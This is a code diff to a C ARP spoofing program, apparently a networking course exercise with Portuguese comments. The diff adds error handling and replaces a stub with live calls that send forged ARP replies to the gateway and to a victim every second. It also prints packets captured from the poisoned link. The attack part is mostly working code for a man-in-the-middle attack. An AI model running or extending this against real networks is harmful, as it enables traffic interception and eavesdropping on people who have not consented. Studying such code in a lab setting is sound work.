@@ -23,6 +23,19 @@
 //2)API para enviar pacotes ARP
 //3)API para receber pacotes ARP
 
+// ERROR CODES
+enum errCode
+{
+	BAD_PARAMETERS,
+	ARP_REQ_TO_GATEWAY,
+	ARP_REP_FROM_GATEWAY,
+	ARP_REP_TO_GATEWAY,
+	ARP_REQ_TO_VICTIM,
+	ARP_REP_FROM_VICTIM,
+	ARP_REP_TO_VICTIM,
+};
+
+
 //Struct holding all required information to run ARP spoofing application
 typedef struct {
 	socket_aux socketInfo;
@@ -69,25 +82,33 @@ void arpReplyExample(socket_aux* socketInfo)
 
 
 //Example function of received packet
-void receivePacketExample(socket_aux* socketInfo)
+void receivePacketExample(arpPoisonData_t *arpData)
 {
 	union eth_buffer buffer_u = {0};
 
 	/* To receive data (in this case we will inspect ARP and IP packets)... */
-	int numbytes = recvfrom(socketInfo->sockfd, buffer_u.raw_data, ETH_LEN, 0, NULL, NULL);
+	int numbytes = recvfrom(arpData->socketInfo.sockfd, buffer_u.raw_data, ETH_LEN, 0, NULL, NULL);
 
 	if (buffer_u.cooked_data.ethernet.eth_type == ntohs(ETH_P_ARP)){
-		printf("ARP packet, %d bytes - operation %d\n", numbytes, ntohs(buffer_u.cooked_data.payload.arp.operation));
+		//if(ntohs(buffer_u.cooked_data.payload.arp.src_paddr) == arpData->victimIP ||
+		//   ntohs(buffer_u.cooked_data.payload.arp.src_paddr) == arpData->gatewayIP)
+		//{
+			printf("ARP packet, %d bytes - operation %d\n", numbytes, ntohs(buffer_u.cooked_data.payload.arp.operation));
+		//}
 	}
 	if (buffer_u.cooked_data.ethernet.eth_type == ntohs(ETH_P_IP)){
-		printf("IP packet, %d bytes - src ip: %d.%d.%d.%d dst ip: %d.%d.%d.%d proto: %d\n",
-			numbytes,
-			buffer_u.cooked_data.payload.ip.src[0], buffer_u.cooked_data.payload.ip.src[1],
-			buffer_u.cooked_data.payload.ip.src[2], buffer_u.cooked_data.payload.ip.src[3],
-			buffer_u.cooked_data.payload.ip.dst[0], buffer_u.cooked_data.payload.ip.dst[1],
-			buffer_u.cooked_data.payload.ip.dst[2], buffer_u.cooked_data.payload.ip.dst[3],
-			buffer_u.cooked_data.payload.ip.proto
-		);
+		//if(ntohs(buffer_u.cooked_data.payload.ip.src) == arpData->victimIP ||
+		//   ntohs(buffer_u.cooked_data.payload.ip.src) == arpData->gatewayIP)
+		//{
+			printf("IP packet, %d bytes - src ip: %d.%d.%d.%d dst ip: %d.%d.%d.%d proto: %d\n",
+				numbytes,
+				buffer_u.cooked_data.payload.ip.src[0], buffer_u.cooked_data.payload.ip.src[1],
+				buffer_u.cooked_data.payload.ip.src[2], buffer_u.cooked_data.payload.ip.src[3],
+				buffer_u.cooked_data.payload.ip.dst[0], buffer_u.cooked_data.payload.ip.dst[1],
+				buffer_u.cooked_data.payload.ip.dst[2], buffer_u.cooked_data.payload.ip.dst[3],
+				buffer_u.cooked_data.payload.ip.proto
+			);
+		//}
 	}
 	
 	if(numbytes > 0)
@@ -105,7 +126,16 @@ void arpPoisonProcess(arpPoisonData_t* arpData)
 		//Send ARP reply to gateway
 		//Send ARP reply to victim
 		//sendARPPacket()
-		arpReplyExample(&arpData->socketInfo);
+		//arpReplyExample(&arpData->socketInfo);
+		
+		
+		// Send ARP Reply to gatway
+		sendARPReplyPacket(&arpData->socketInfo, arpData->gatewayIP, arpData->gatewayMAC, arpData->victimIP);
+		printPacket(REPLY, NULL);
+
+		// Send ARP Reply to victim
+		sendARPReplyPacket(&arpData->socketInfo, arpData->victimIP, arpData->victimMAC, arpData->gatewayIP);
+		printPacket(REPLY, NULL);
 
 		//wait to send another message
 		sleep(1);
@@ -151,6 +181,39 @@ int isIPForwardEnabled()
 	return result;
 }
 
+void errorHandler(int errorCode, int *result)
+{
+	*result = -1;
+	switch(errorCode)
+	{
+		case BAD_PARAMETERS:
+			printHelp();
+			break;
+		case ARP_REQ_TO_GATEWAY:
+			printf("Fail to send ARP Request packet to Gateway\n");
+			break;
+		case ARP_REP_FROM_GATEWAY:
+			printf("Fail to receive ARP Reply packet from Gateway\n");
+			break;
+		case ARP_REP_TO_GATEWAY:
+			printf("Fail to send ARP Reply packet to Gateway\n");
+			break;
+		case ARP_REQ_TO_VICTIM:
+			printf("Fail to send ARP Request packet to Victim\n");
+			break;
+		case ARP_REP_FROM_VICTIM:
+			printf("Fail to receive ARP Reply packet from Victim\n");
+			break;
+		case ARP_REP_TO_VICTIM:
+			printf("Fail to send ARP Reply packet to Victim\n");
+			break;
+		default:
+			printf("Invalid ERROR code\n");
+			break;
+	}
+}
+
+
 int main(int argc, char *argv[])
 {
 	int result = 1;	//Operation result
@@ -191,14 +254,19 @@ int main(int argc, char *argv[])
 			printf("Fail to send ARP Request packet to Gateway\n");
 			result = -2;
 		}
+		else
+		{
+			printPacket(REQUEST, NULL);
+		}
 		if((result == 1) && (rcvARPPacket(&arpData.socketInfo, &receivedPacket, arpData.gatewayIP) <= 0))
 		{
 			printf("Fail to receive ARP Reply packet from Gateway\n");
 			result = -3;
-		}		
+		}
 		if (result == 1) 
 		{
 			memcpy(arpData.gatewayMAC, receivedPacket.cooked_data.ethernet.src_addr, ETH_ALEN);
+			printPacket(RECEIVED, &receivedPacket);
 		}
 		
 
@@ -206,6 +274,10 @@ int main(int argc, char *argv[])
 		{
 			printf("Fail to send ARP Request packet to Victim\n");
 			result = -4;
+		}
+		else
+		{
+			printPacket(REQUEST, NULL);
 		}
 		if((result == 1) && (rcvARPPacket(&arpData.socketInfo, &receivedPacket, arpData.victimIP) <= 0))
 		{
@@ -215,6 +287,7 @@ int main(int argc, char *argv[])
 		if (result == 1) 
 		{
 			memcpy(arpData.victimMAC, receivedPacket.cooked_data.ethernet.src_addr, ETH_ALEN);
+			printPacket(RECEIVED, &receivedPacket);
 		}		
 	}
 	
@@ -237,7 +310,7 @@ int main(int argc, char *argv[])
 				//rcvARPPacket()
 				//TODO: Print packet data
 				//printARPPacket()
-				receivePacketExample(&arpData.socketInfo);
+				receivePacketExample(&arpData);
 			}
 
 			//Finalize: Kill child process and close socket
